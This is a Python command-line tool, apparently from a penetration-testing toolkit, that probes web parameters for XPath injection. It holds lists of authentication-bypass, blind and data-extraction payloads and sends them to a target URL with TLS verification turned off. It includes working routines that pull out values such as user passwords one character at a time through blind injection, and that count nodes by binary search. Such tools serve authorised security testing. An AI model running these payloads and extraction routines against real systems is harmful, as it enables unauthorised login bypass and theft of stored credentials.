"""
XPath Injection Testing Wrapper - Tests for XPath injection vulnerabilities
"""
import sys
import argparse
import json
import requests
from pathlib import Path
from typing import Dict, List, Any, Optional
from dataclasses import dataclass

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from utils.base_wrapper import InjectionTool


@dataclass
class XPathFinding:
    """Represents an XPath injection finding"""
    payload: str
    payload_type: str
    status_code: int
    response_length: int
    potential_vuln: bool
    evidence: Optional[str] = None


class XPathInjectionTester(InjectionTool):
    """Wrapper for XPath injection testing"""

    # Basic XPath injection payloads
    BASIC_PAYLOADS = [
        "' or '1'='1",
        "' or ''='",
        "x' or 1=1 or 'x'='y",
        "'] | //user/*[contains(*,'",
        "') or ('x'='x",
        "' or count(parent::*[position()=1])=0 or 'a'='b",
        "' or contains(name(parent::*[position()=1]),'a') or 'a'='b",
        "1 or 1=1",
        "' and '1'='1",
        "admin' or '1'='1' or 'a'='a",
    ]

    # Authentication bypass payloads
    AUTH_BYPASS_PAYLOADS = [
        "' or '1'='1' or ''='",
        "admin'/*",
        "admin'--",
        "' or 1]/*|//*['",
        "' or 1=1 or ''='",
        "admin' or '1'='1",
        "' or substring(name(parent::*[position()=1]),1,1)='a' or 'a'='b",
        "x]|//user[username='admin' and password='",
        "' or name(//user[1])='user' or 'a'='b",
        "admin']/*|//*['",
    ]

    # Blind XPath injection payloads (boolean-based)
    BLIND_PAYLOADS = [
        "' or string-length(name(parent::*[position()=1]))>0 or 'a'='b",  # True
        "' or string-length(name(parent::*[position()=1]))>100 or 'a'='b",  # False
        "' or substring(//user[1]/password,1,1)='a' or 'a'='b",
        "' or count(//user)>0 or 'a'='b",  # True if users exist
        "' or count(//user)>1000 or 'a'='b",  # Likely false
        "' or boolean(//user) or 'a'='b",
        "' or not(boolean(//nonexistent)) or 'a'='b",
    ]

    # Data extraction payloads
    EXTRACTION_PAYLOADS = [
        "' or //user[1]/username/text()='' or ''='",
        "' or //user[1]/password/text()='' or ''='",
        "' or name(//*)='' or ''='",
        "' or //*/text()='' or ''='",
        "' or local-name(/*)='' or ''='",
    ]

    # Error-inducing payloads
    ERROR_PAYLOADS = [
        "'",
        "\"",
        "'--",
        "\"--",
        "'/*",
        "']",
        "')",
        "' or",
        "' and",
        "') or ('",
        "'] or ['",
        "']]",
        "{{",
        "}}",
    ]

    # Special XPath function payloads
    FUNCTION_PAYLOADS = [
        "' or string-length('')=0 or ''='",
        "' or normalize-space('')='' or ''='",
        "' or concat('a','b')='ab' or ''='",
        "' or contains('test','t') or ''='",
        "' or starts-with('test','t') or ''='",
        "' or translate('abc','abc','ABC')='ABC' or ''='",
        "' or sum(//price)>=0 or ''='",
        "' or position()>=1 or ''='",
        "' or last()>=1 or ''='",
    ]

    # Error indicators for detection
    ERROR_INDICATORS = [
        'xpath', 'xmldom', 'xml', 'syntax error', 'expression',
        'invalid predicate', 'unexpected token', 'parse error',
        'xmlsyntaxerror', 'xmlexception', 'saxparse', 'dom',
        'evaluatexpath', 'xpathresult', 'xpatherror', 'node',
        'selectnodes', 'selectsinglenode', 'libxml', 'lxml',
        'xslt', 'transform', 'stylesheet', 'namespace',
        'document()', 'node()', 'text()', 'element'
    ]

    @property
    def tool_name(self) -> str:
        return "xpath_injection"

    def _build_target_args(self, target: str, **kwargs) -> list:
        """XPath injection doesn't use CLI - this returns empty"""
        return []

    def check_tool_installed(self) -> bool:
        """Override - this tool is pure Python"""
        try:
            import requests
            return True
        except ImportError:
            return False

    def test_injection(self, url: str, param_name: str, method: str = 'GET',
                       headers: Optional[Dict] = None, cookies: Optional[Dict] = None,
                       timeout: int = 10, payload_set: str = 'all') -> List[XPathFinding]:
        """Test for XPath injection vulnerabilities."""
        findings = []

        # Get baseline response
        baseline = self._get_baseline(url, param_name, method, headers, cookies, timeout)

        # Select payloads based on payload set
        if payload_set == 'basic':
            payloads = self.BASIC_PAYLOADS
        elif payload_set == 'auth_bypass':
            payloads = self.AUTH_BYPASS_PAYLOADS
        elif payload_set == 'blind':
            payloads = self.BLIND_PAYLOADS
        elif payload_set == 'extraction':
            payloads = self.EXTRACTION_PAYLOADS
        elif payload_set == 'error':
            payloads = self.ERROR_PAYLOADS
        elif payload_set == 'function':
            payloads = self.FUNCTION_PAYLOADS
        else:  # 'all'
            payloads = (self.BASIC_PAYLOADS + self.AUTH_BYPASS_PAYLOADS +
                       self.ERROR_PAYLOADS + self.FUNCTION_PAYLOADS)

        for payload in payloads:
            finding = self._test_payload(
                url, param_name, payload, method, headers, cookies, baseline, timeout
            )
            findings.append(finding)

        return findings

    def test_blind_injection(self, url: str, param_name: str, method: str = 'GET',
                             headers: Optional[Dict] = None, cookies: Optional[Dict] = None,
                             timeout: int = 10) -> Dict[str, Any]:
        """Test for blind XPath injection using response comparison."""
        results = {
            'vulnerable': False,
            'technique': None,
            'evidence': []
        }

        # Test pairs: (true_condition, false_condition)
        test_pairs = [
            ("' or '1'='1", "' or '1'='2"),
            ("' or 1=1 or ''='", "' or 1=2 or ''='"),
            ("' or string-length('')=0 or ''='", "' or string-length('')=1 or ''='"),
            ("' or count(//*)>0 or ''='", "' or count(//*)>999999 or ''='"),
            ("' or boolean(1) or ''='", "' or boolean(0) or ''='"),
        ]

        for true_payload, false_payload in test_pairs:
            try:
                # Test true condition
                true_response = self._send_request(
                    url, param_name, true_payload, method, headers, cookies, timeout
                )

                # Test false condition
                false_response = self._send_request(
                    url, param_name, false_payload, method, headers, cookies, timeout
                )

                # Compare responses
                if true_response and false_response:
                    length_diff = abs(len(true_response.text) - len(false_response.text))
                    status_diff = true_response.status_code != false_response.status_code

                    if length_diff > 50 or status_diff:
                        results['vulnerable'] = True
                        results['technique'] = 'boolean_blind'
                        results['evidence'].append({
                            'true_payload': true_payload,
                            'false_payload': false_payload,
                            'true_length': len(true_response.text),
                            'false_length': len(false_response.text),
                            'true_status': true_response.status_code,
                            'false_status': false_response.status_code,
                            'length_difference': length_diff
                        })

            except Exception as e:
                continue

        return results

    def extract_data(self, url: str, param_name: str, xpath_target: str,
                     method: str = 'GET', headers: Optional[Dict] = None,
                     cookies: Optional[Dict] = None, timeout: int = 10,
                     charset: str = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
                     max_length: int = 32) -> Dict[str, Any]:
        """Attempt to extract data using blind XPath injection."""
        extracted = ""

        # Get baseline responses for true and false
        true_baseline = self._send_request(
            url, param_name, "' or '1'='1", method, headers, cookies, timeout
        )
        false_baseline = self._send_request(
            url, param_name, "' or '1'='2", method, headers, cookies, timeout
        )

        if not true_baseline or not false_baseline:
            return {'extracted': None, 'error': 'Could not establish baseline'}

        true_length = len(true_baseline.text)
        false_length = len(false_baseline.text)

        if abs(true_length - false_length) < 10:
            return {'extracted': None, 'error': 'Response lengths too similar for blind injection'}

        # Character-by-character extraction
        for position in range(1, max_length + 1):
            found_char = False
            for char in charset:
                # Build payload to test if character at position equals char
                payload = f"' or substring({xpath_target},{position},1)='{char}' or ''='"

                try:
                    response = self._send_request(
                        url, param_name, payload, method, headers, cookies, timeout
                    )

                    if response:
                        # Check if response matches "true" condition
                        if abs(len(response.text) - true_length) < abs(len(response.text) - false_length):
                            extracted += char
                            found_char = True
                            print(f"[*] Extracted: {extracted}")
                            break
                except Exception:
                    continue

            if not found_char:
                break

        return {
            'extracted': extracted,
            'length': len(extracted),
            'xpath_target': xpath_target,
            'complete': len(extracted) == max_length
        }

    def extract_node_count(self, url: str, param_name: str, xpath_expr: str,
                           method: str = 'GET', headers: Optional[Dict] = None,
                           cookies: Optional[Dict] = None, timeout: int = 10,
                           max_count: int = 100) -> Dict[str, Any]:
        """Extract count of nodes matching XPath expression."""
        # Binary search for count
        low, high = 0, max_count

        while low < high:
            mid = (low + high + 1) // 2
            payload = f"' or count({xpath_expr})>={mid} or ''='"

            try:
                response = self._send_request(
                    url, param_name, payload, method, headers, cookies, timeout
                )

                # Compare with true baseline
                true_response = self._send_request(
                    url, param_name, "' or '1'='1", method, headers, cookies, timeout
                )

                if response and true_response:
                    # If response matches true condition
                    if abs(len(response.text) - len(true_response.text)) < 50:
                        low = mid
                    else:
                        high = mid - 1
                else:
                    break
            except Exception:
                break

        return {
            'xpath_expression': xpath_expr,
            'count': low,
            'method': 'binary_search'
        }

    def _test_payload(self, url: str, param_name: str, payload: str,
                      method: str, headers: Optional[Dict], cookies: Optional[Dict],
                      baseline: Optional[int], timeout: int,
                      payload_type: str = 'basic') -> XPathFinding:
        """Send request with XPath payload."""
        try:
            response = self._send_request(
                url, param_name, payload, method, headers, cookies, timeout
            )

            if response:
                vuln_detected = self._detect_vulnerability(response, baseline)

                return XPathFinding(
                    payload=payload,
                    payload_type=payload_type,
                    status_code=response.status_code,
                    response_length=len(response.text),
                    potential_vuln=vuln_detected,
                    evidence=response.text[:500] if vuln_detected else None
                )
            else:
                return XPathFinding(
                    payload=payload,
                    payload_type=payload_type,
                    status_code=0,
                    response_length=0,
                    potential_vuln=False,
                    evidence="No response received"
                )

        except requests.exceptions.Timeout:
            return XPathFinding(
                payload=payload,
                payload_type=payload_type,
                status_code=0,
                response_length=0,
                potential_vuln=True,
                evidence='Request timed out - possible injection point'
            )
        except Exception as e:
            return XPathFinding(
                payload=payload,
                payload_type=payload_type,
                status_code=0,
                response_length=0,
                potential_vuln=False,
                evidence=str(e)
            )

    def _send_request(self, url: str, param_name: str, payload: str,
                      method: str, headers: Optional[Dict], cookies: Optional[Dict],
                      timeout: int) -> Optional[requests.Response]:
        """Send HTTP request with payload."""
        try:
            if method.upper() == 'GET':
                response = requests.get(
                    url,
                    params={param_name: payload},
                    headers=headers,
                    cookies=cookies,
                    timeout=timeout,
                    allow_redirects=False,
                    verify=False
                )
            else:
                response = requests.post(
                    url,
                    data={param_name: payload},
                    headers=headers,
                    cookies=cookies,
                    timeout=timeout,
                    allow_redirects=False,
                    verify=False
                )
            return response
        except Exception:
            return None

    def _get_baseline(self, url: str, param_name: str, method: str,
                      headers: Optional[Dict], cookies: Optional[Dict],
                      timeout: int) -> Optional[int]:
        """Get baseline response length."""
        try:
            if method.upper() == 'GET':
                response = requests.get(
                    url,
                    params={param_name: 'test'},
                    headers=headers,
                    cookies=cookies,
                    timeout=timeout,
                    verify=False
                )
            else:
                response = requests.post(
                    url,
                    data={param_name: 'test'},
                    headers=headers,
                    cookies=cookies,
                    timeout=timeout,
                    verify=False
                )
            return len(response.text)
        except Exception:
            return None

    def _detect_vulnerability(self, response: requests.Response,
                             baseline: Optional[int]) -> bool:
        """Detect XPath errors or anomalies."""
        text_lower = response.text.lower()

        # Check for XPath/XML error messages
        if any(indicator in text_lower for indicator in self.ERROR_INDICATORS):
            return True

        # Check for significant response length difference
        if baseline:
            length_diff = abs(len(response.text) - baseline)
            if length_diff > 100:
                return True

        # Check for unusual status codes
        if response.status_code in [500, 502, 503]:
            return True

        return False

    def run(self, target: str, output_file: str = None, **kwargs) -> Dict[str, Any]:
        """Run XPath injection tests."""
        from datetime import datetime

        self.start_time = datetime.now()

        param_name = kwargs.get('param', 'query')
        method = kwargs.get('method', 'GET')
        headers = kwargs.get('headers')
        cookies = kwargs.get('cookies')
        payload_set = kwargs.get('payload_set', 'all')
        test_blind = kwargs.get('test_blind', False)
        timeout = kwargs.get('timeout', 10)

        all_findings = []

        print(f"[*] Testing XPath injection on {target}")
        print(f"[*] Parameter: {param_name}, Method: {method}")

        # Standard injection tests
        print("[*] Running standard XPath injection tests...")
        findings = self.test_injection(
            url=target, param_name=param_name, method=method,
            headers=headers, cookies=cookies, timeout=timeout,
            payload_set=payload_set
        )
        all_findings.extend(findings)

        # Blind injection tests
        blind_results = None
        if test_blind:
            print("[*] Running blind XPath injection tests...")
            blind_results = self.test_blind_injection(
                url=target, param_name=param_name, method=method,
                headers=headers, cookies=cookies, timeout=timeout
            )

        self.end_time = datetime.now()
        duration = (self.end_time - self.start_time).total_seconds()

        # Filter vulnerable findings
        vulnerable = [f for f in all_findings if f.potential_vuln]

        # Save results
        if output_file is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = self.output_dir / f"xpath_injection_{timestamp}.json"

        results = {
            'target': target,
            'parameter': param_name,
            'method': method,
            'total_tests': len(all_findings),
            'vulnerable_count': len(vulnerable),
            'blind_results': blind_results,
            'findings': [
                {
                    'payload': f.payload,
                    'payload_type': f.payload_type,
                    'status_code': f.status_code,
                    'response_length': f.response_length,
                    'potential_vuln': f.potential_vuln,
                    'evidence': f.evidence
                }
                for f in all_findings
            ]
        }

        with open(output_file, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"[+] Results saved to: {output_file}")

        return {
            'success': True,
            'tool': self.tool_name,
            'target': target,
            'duration': duration,
            'output_file': str(output_file),
            'results': all_findings,
            'blind_results': blind_results,
            'vulnerable_count': len(vulnerable)
        }


def main():
    parser = argparse.ArgumentParser(
        description="XPath Injection Tester - Test for XPath injection vulnerabilities",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python xpath_injection.py -u "https://example.com/search" -p query
  python xpath_injection.py -u "https://example.com/login" -p username --method POST
  python xpath_injection.py -u "https://example.com/xml" -p id --test-blind
  python xpath_injection.py -u "https://example.com/api" -p filter --payload-set auth_bypass
        """
    )

    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--param", default="query", help="Parameter to test (default: query)")
    parser.add_argument("-m", "--method", default="GET", choices=['GET', 'POST'],
                       help="HTTP method (default: GET)")
    parser.add_argument("--payload-set", default="all",
                       choices=['all', 'basic', 'auth_bypass', 'blind', 'extraction', 'error', 'function'],
                       help="Payload set to use (default: all)")
    parser.add_argument("--test-blind", action="store_true",
                       help="Run blind injection tests")
    parser.add_argument("-H", "--header", action="append", dest="headers",
                       help="Custom header (format: 'Name: Value')")
    parser.add_argument("--cookie", help="Cookie string")
    parser.add_argument("-t", "--timeout", type=int, default=10,
                       help="Request timeout in seconds (default: 10)")
    parser.add_argument("-o", "--output", help="Output file path")

    args = parser.parse_args()

    # Parse headers
    headers = {}
    if args.headers:
        for h in args.headers:
            if ':' in h:
                name, value = h.split(':', 1)
                headers[name.strip()] = value.strip()

    # Parse cookies
    cookies = None
    if args.cookie:
        cookies = {}
        for cookie in args.cookie.split(';'):
            if '=' in cookie:
                name, value = cookie.split('=', 1)
                cookies[name.strip()] = value.strip()

    tester = XPathInjectionTester()

    result = tester.run(
        target=args.url,
        param=args.param,
        method=args.method,
        payload_set=args.payload_set,
        test_blind=args.test_blind,
        headers=headers if headers else None,
        cookies=cookies,
        timeout=args.timeout,
        output_file=args.output
    )

    # Print summary
    print(f"\n{'='*60}")
    print(f"XPath Injection Test Results")
    print(f"{'='*60}")
    print(f"Target: {args.url}")
    print(f"Parameter: {args.param}")
    print(f"Total Tests: {len(result['results'])}")
    print(f"Potential Vulnerabilities: {result['vulnerable_count']}")

    if result.get('blind_results') and result['blind_results'].get('vulnerable'):
        print(f"\n[!] BLIND XPath INJECTION DETECTED!")
        print(f"  Technique: {result['blind_results']['technique']}")

    if result['vulnerable_count'] > 0:
        print(f"\n[!] POTENTIAL XPath INJECTION FOUND!")
        for finding in result['results']:
            if finding.potential_vuln:
                print(f"\n  Payload: {finding.payload}")
                print(f"  Type: {finding.payload_type}")
                print(f"  Status Code: {finding.status_code}")
                if finding.evidence:
                    print(f"  Evidence: {finding.evidence[:200]}...")
    else:
        print("\n[+] No XPath injection vulnerabilities detected")

    return 0 if result['success'] else 1


if __name__ == "__main__":
    # Suppress SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    sys.exit(main())
